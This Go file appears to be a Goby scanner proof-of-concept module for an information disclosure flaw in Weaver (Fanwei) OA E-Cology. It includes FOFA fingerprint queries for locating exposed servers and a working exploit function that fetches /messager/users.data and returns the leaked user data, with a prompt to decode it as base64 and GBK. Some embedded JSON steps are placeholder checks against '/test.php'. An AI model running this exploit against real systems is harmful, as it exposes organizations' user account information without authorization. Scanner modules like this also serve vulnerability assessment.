package exploits

import (
	"encoding/base64"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Fanwei OA E-Cology /messager/users.data Information Disclosure Vulnerability",
    "Description": "<p>Fanwei OA E-Colgy is a digital office product for medium and large organizations. It is based on a new design concept and management idea, and aims to create a new and efficient collaborative office environment for medium and large organizations. Fanwei OA E-Cology /users.data has a sensitive information leakage vulnerability. Attackers can exploit this vulnerability to obtain sensitive information of the system.</p>",
    "Product": "Weaver-OA(E-COLOGY)",
    "Homepage": "https://www.weaver.com.cn/",
    "DisclosureDate": "2024-08-21",
    "PostTime": "2024-09-19",
    "Author": "2826161446@qq.com",
    "FofaQuery": "((body=\"szFeatures\" && body=\"redirectUrl\") || (body=\"rndData\" && body=\"isdx\") || (body=\"typeof poppedWindow\" && body=\"client/jquery.client_wev8.js\") || body=\"/theme/ecology8/jquery/js/zDialog_wev8.js\" || body=\"ecology8/lang/weaver_lang_7_wev8.js\" || body=\"src=\\\"/js/jquery/jquery_wev8.js\" || (header=\"Server: WVS\" && (title!=\"404 Not Found\" && header!=\"404 Not Found\"))) && header!=\"testBanCookie\" && header!=\"Couchdb\" && header!=\"JoomlaWor\" && body!=\"<title>28ZE</title>\"",
    "GobyQuery": "((body=\"szFeatures\" && body=\"redirectUrl\") || (body=\"rndData\" && body=\"isdx\") || (body=\"typeof poppedWindow\" && body=\"client/jquery.client_wev8.js\") || body=\"/theme/ecology8/jquery/js/zDialog_wev8.js\" || body=\"ecology8/lang/weaver_lang_7_wev8.js\" || body=\"src=\\\"/js/jquery/jquery_wev8.js\" || (header=\"Server: WVS\" && (title!=\"404 Not Found\" && header!=\"404 Not Found\"))) && header!=\"testBanCookie\" && header!=\"Couchdb\" && header!=\"JoomlaWor\" && body!=\"<title>28ZE</title>\"",
    "Level": "0",
    "Impact": "<p>Fanwei OAE-Cology /users.data has a sensitive information leakage vulnerability. Attackers can exploit this vulnerability to obtain sensitive information of the system.</p>",
    "Recommendation": "<p>1. Enable access restrictions to upgrade to the new version</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "baseurl",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "OR",
        {
            "Request": {
                "method": "GET",
                "uri": "",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Information Disclosure",
        "2H1W"
    ],
    "VulType": [
        "Information Disclosure"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "5.6",
    "Translation": {
        "CN": {
            "Name": "泛微OA E-Cology /messager/users.data 信息泄漏漏洞",
            "Product": "泛微-OA（e-cology）",
            "Description": "<p>泛微OA E-Colgy是一款面向中大型组织的数字化办公产品，它基于全新的设计理念和管理思想，旨在为中大型组织创建一个全新的高效协同办公环境。泛微OAE-Cology /users.data存在敏感信息泄露漏洞，攻击者利用此漏洞可以获取系统敏感信息。<br></p>",
            "Recommendation": "<p>1.开启访问限制升级新版本<br></p>",
            "Impact": "<p>泛微OAE-Cology /users.data存在敏感信息泄露漏洞，攻击者利用此漏洞可以获取系统敏感信息。<br></p>",
            "VulType": [
                "信息泄露"
            ],
            "Tags": [
                "信息泄露",
                "两高一弱"
            ]
        },
        "EN": {
            "Name": "Fanwei OA E-Cology /messager/users.data Information Disclosure Vulnerability",
            "Product": "Weaver-OA(E-COLOGY)",
            "Description": "<p>Fanwei OA E-Colgy is a digital office product for medium and large organizations. It is based on a new design concept and management idea, and aims to create a new and efficient collaborative office environment for medium and large organizations. Fanwei OA E-Cology /users.data has a sensitive information leakage vulnerability. Attackers can exploit this vulnerability to obtain sensitive information of the system.<br></p>",
            "Recommendation": "<p>1. Enable access restrictions to upgrade to the new version<br></p>",
            "Impact": "<p>Fanwei OAE-Cology /users.data has a sensitive information leakage vulnerability. Attackers can exploit this vulnerability to obtain sensitive information of the system.<br></p>",
            "VulType": [
                "Information Disclosure"
            ],
            "Tags": [
                "Information Disclosure",
                "2H1W"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9954"
}`

	postOrGet_4MOFgcJkvn := func(hostInfo *httpclient.FixUrl, fileUrl string) (string, error) {
		setGetRequest := func(hostInfo *httpclient.FixUrl, urlGet string, head map[string]string) (*httpclient.HttpResponse, error) {
			GetRequest := httpclient.NewGetRequestConfig(urlGet)
			GetRequest.Timeout = 15
			GetRequest.VerifyTls = false
			GetRequest.FollowRedirect = false
			for headName, headValue := range head {
				GetRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, GetRequest)
		}

		header := map[string]string{
			"User-Agent":      "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_10) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/12.0 Safari/1200.1.25",
			"Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
			"Accept-Language": "zh-CN,zh;q=0.9",
			"Connection":      "close",
		}

		resp, err := setGetRequest(hostInfo, fileUrl, header)
		if err != nil || resp.StatusCode != 200 {
			return "", err
		}

		// 注意：返回值为（最终要返回的读取结果，错误）
		return resp.RawBody, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 此处需要修改：设置成功后的vulurl
			vulURL := "/messager/users.data"
			baseurl := base64.StdEncoding.EncodeToString([]byte("<loginid>"))
			// 此处需要修改：字典键为请求的URL地址，值为返回包判断成功的条件
			defaultModeMap := map[string]string{
				"/messager/users.data": baseurl,
			}
			// 函数继承
			uploadFileFunc := postOrGet_4MOFgcJkvn

			// 请注意：后续代码为模板代码，非特殊情况，无需更改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			for fileUrl, fileText := range defaultModeMap {
				resp, err := uploadFileFunc(u, fileUrl)
				if err != nil {
					continue
				}
				if strings.Contains(resp, fileText) {
					// 设置VULURL
					ss.VulURL = u.HostInfo + vulURL
					return true
				}
			}
			return false
		},

		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			var fileUrl string
			var fileText string
			mode := goutils.B2S(ss.Params["mode"])
			baseurl := base64.StdEncoding.EncodeToString([]byte("<loginid>"))
			// 此处需要修改：字典键为用户选择读取文件的类型，值是一个数组，分别为请求的URL地址，返回包判断成功的条件
			defaultModeMap := map[string][2]string{
				"baseurl": {"/messager/users.data", baseurl},
			}
			// 此处需要修改：函数继承
			uploadFileFunc := postOrGet_4MOFgcJkvn

			// 请注意，后续代码为模板固化，正常情况下均无需修改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			if mode == "Customize" {
				fileUrl = goutils.B2S(ss.Params["Customize"])
			} else {
				if _, ok := defaultModeMap[mode]; ok {
					fileUrl = defaultModeMap[mode][0]
					fileText = defaultModeMap[mode][1]
				} else {
					expResult.Success = false
					return expResult
				}
			}

			// 获取返回结果url和返回请求头
			resp, err := uploadFileFunc(expResult.HostInfo, fileUrl)
			if err != nil || (!strings.Contains(resp, fileText) && mode != "Customize") {
				expResult.Success = false
				return expResult
			}

			expResult.Success = true
			expResult.Output = "请使用base64+gbk解码下面的密文：" + resp
			return expResult
		},
	))
}
